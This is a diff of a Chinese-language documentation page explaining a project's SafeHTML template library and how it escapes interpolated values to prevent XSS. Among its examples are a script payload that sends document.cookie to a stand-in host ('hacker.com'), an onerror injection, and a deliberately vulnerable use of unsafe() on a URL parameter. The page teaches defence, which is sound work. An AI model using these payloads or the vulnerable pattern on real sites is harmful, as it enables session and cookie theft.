@@ -1,84 +1,115 @@
 # 🛡️ 模板渲染與 XSS 防護 (SafeHTML)
 
-在 `plainvanillaweb` 中，我們不依賴龐大的框架結構，而是使用原生 JavaScript 的 **標籤模板字串 (Tagged Template Literals)** 來建立 UI。
+在原生 Web 中，動態修改網頁內容通常會使用 `element.innerHTML = markup`。然而，這是一個潛在的安全性漏洞來源：如果 `markup` 中包含了使用者輸入的惡意代碼，便會觸發 **XSS (跨站腳本攻擊)**。
 
-為了確保安全性並防範 XSS (跨站腳本攻擊)，我們實作了一套類似 Lit 或 React 的安全渲染機制。
+本專案實作了一套預設防禦的 **SafeHTML 渲染機制 (`lib/html.js`)**，為原生 JavaScript 帶來了如同 Lit 或 React 般的安全保障。
 
-## 為什麼需要防護？
+---
 
-當我們透過 `element.innerHTML` 渲染來自外部或使用者的動態變數時，如果變數中包含了 `<script>` 或其他惡意 HTML 標籤，瀏覽器就會執行這些代碼。
+## ☣️ 1. 什麼是 XSS 漏洞？
 
-## `html` 標籤模板的自動轉義
+當應用直接將未過濾的使用者輸入作為 HTML 渲染時，駭客可以注入以下惡意代碼：
 
-在我們的專案中，所有的 UI 組件都必須使用 `html` 函數來包裝模板：
+```html
+<!-- 惡意輸入範例 A：直接執行腳本 -->
+<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>
 
+<!-- 惡意輸入範例 B：隱蔽的屬性型注入 -->
+<img src="invalid-image.jpg" onerror="sendSensitiveDataToHacker()">
+```
+
+如果您的代碼是這樣寫的：
+```javascript
+// ❌ 嚴重漏洞：userInput 內含惡意腳本時，會被直接執行
+container.innerHTML = `<div>${userInput}</div>`;
+```
+駭客將能輕易竊取使用者 Cookie、Session 憑證，或劫持網頁內容。
+
+---
+
+## 🛡️ 2. `html` 標籤模板的自動安全轉義 (Auto Escaping)
+
+為了解決此痛點，本專案所有繼承自 `BaseComponent` 的組件皆強制要求在 `render()` 中返回使用 `html\`...\`` 標籤模板包裝的內容。
+
+### 2.1 自動轉義機制
+`html` 模板會掃描所有 `${}` 插值，並自動使用 `escapeHTML` 把 HTML 敏感字元替換成安全實體：
+* `&` ➜ `&amp;`
+* `<` ➜ `&lt;`
+* `>` ➜ `&gt;`
+* `"` ➜ `&quot;`
+* `'` ➜ `&#039;`
+
+### 2.2 代碼演示
 ```javascript
 import { html } from '../../lib/html.js';
 
 render() {
-    const userInput = "<script>alert('XSS')</script>";
+    const userInput = "<script>alert('hack')</script>";
     
-    // 🛡️ html 函數會自動將變數中的危險字元轉義為實體符號 (&lt;script&gt;)
+    // 🛡️ 系統會自動轉義為: &lt;script&gt;alert(&#039;hack&#039;)&lt;/script&gt;
+    // 瀏覽器只會將其顯示為純文字，而不會將其作為代碼執行！
     return html`
-        <div class="user-profile">
-            <h3>使用者輸入：${userInput}</h3> 
+        <div class="comment">
+            <p>用戶留言：${userInput}</p>
         </div>
     `;
 }
 ```
 
-這表示**在預設情況下，你不需要擔心變數注入的安全問題，所有的插值 `${}` 都會被當純文字處理。**
+---
 
-## 何時使用 `unsafe`？
+## ⚠️ 3. 什麼是 `unsafe`？如何安全使用？
 
-有時候，我們確實需要將一個「已經組裝好的 HTML 字串」動態插入到畫面中，而不是被轉義成純文字。（例如：從 Markdown 解析出來的 HTML、或是動態生成的選單結構）。
-
-如果直接將 HTML 字串放入 `${}`，它在畫面上會裸露成 `<div>...</div>` 這樣的原始碼，因為它被當作純文字轉義了。
-
-這時候，你需要使用 `unsafe` 函數明確告訴系統：「**這段 HTML 內容是受信任的，請直接渲染為 DOM**」。
+有些情境下，我們**必須**將純字串渲染成真實的 HTML（例如：將 Markdown 轉換出來的 HTML 渲染到文檔中心）。
+如果直接放在 `html` 模板中，畫面會直接顯示 HTML 原始碼。這時，我們需要使用 `unsafe` 來強制標記該字串為受信任的安全內容：
 
 ```javascript
 import { html, unsafe } from '../../lib/html.js';
 
 render() {
-    // 從內部邏輯動態產生的可信 HTML 結構
-    const menuHtml = "<ul class='nav'><li>首頁</li></ul>";
+    const markdownHtml = "<h1>文檔標題</h1><p>內文...</p>";
     
-    // ⚠️ 如果直接放 ${menuHtml}，會看到純文字原始碼
-    // ✅ 使用 unsafe 包裝，將其標記為受信任的 HTML 節點
+    // ✅ 使用 unsafe 告訴渲染引擎：「此字串是安全的，請直接解析為 DOM」
     return html`
-        <nav>
-            ${unsafe(menuHtml)}
-        </nav>
+        <article class="article-content">
+            ${unsafe(markdownHtml)}
+        </article>
     `;
 }
 ```
 
-> [!WARNING]
-> **絕對不要**將包含使用者直接輸入 (User Input) 或不可信來源的變數丟給 `unsafe()` 處理，這將導致 XSS 漏洞。
-
-## 巢狀組件的自動識別
-
-我們實作的 `html` 模板具有深度辨識的能力。
-如果你在 `${}` 裡面放入的變數本身就是另一個 `html` 模板的回傳值，或是包含這類物件的陣列，系統可以**自動識別它們為受信任節點**，無縫進行巢狀渲染，而不需要你手動加上 `unsafe`。
-
-這讓組件拆分變得非常直覺：
+### 🚫 `unsafe` 的致命錯誤用法 (Anti-Pattern)
+**千萬不要將含有使用者直接輸入、網址參數 (Query String) 或外部未經過濾 API 回傳的欄位傳給 `unsafe`：**
 
 ```javascript
-// ✅ 安全且正確的巢狀渲染
+// ❌ 致命漏洞！這會完全繞過 XSS 防護，重新將系統暴露在危險之中
+const query = new URLSearchParams(window.location.search);
+const userName = query.get('name'); // 駭客可傳入惡意代碼
+return html`
+    <div>歡迎, ${unsafe(userName)}</div> 
+`;
+```
+
+---
+
+## 🔄 4. 巢狀 SafeHTML 的自動傳遞
+
+`html` 標籤模板內建遞迴識別。如果 `${}` 中的內容本身就是另一個由 `html\`...\`` 產生的 `SafeHTML` 物件，或是該物件組成的陣列，系統會自動將其識別為安全節點進行巢狀渲染，而不會對其進行二次轉義：
+
+```javascript
 render() {
+    // 巢狀安全組件
     const header = html`<header>網站標題</header>`;
-    const items = [1, 2, 3].map(i => html`<li>項目 ${i}</li>`);
+    
+    // 安全的項目陣列
+    const listItems = ['選項一', '選項二'].map(item => html`<li>${item}</li>`);
     
     return html`
-        <div>
+        <div class="layout">
             ${header}
-            <ul>${items}</ul>
+            <ul>${listItems}</ul>
         </div>
     `;
 }
 ```
-
-總結來說：
-- **`html`**: 預設將變數轉為純文字 (防禦 XSS)。用來包裝所有前端模板。
-- **`unsafe`**: 將字串標記為安全。僅用於將「動態生成的純字串 HTML」轉為實際 DOM 節點時使用。
+此機制可讓您放心地將 UI 模板進行模組化拆分與傳遞，兼顧「極致的開發體驗」與「預設安全」。
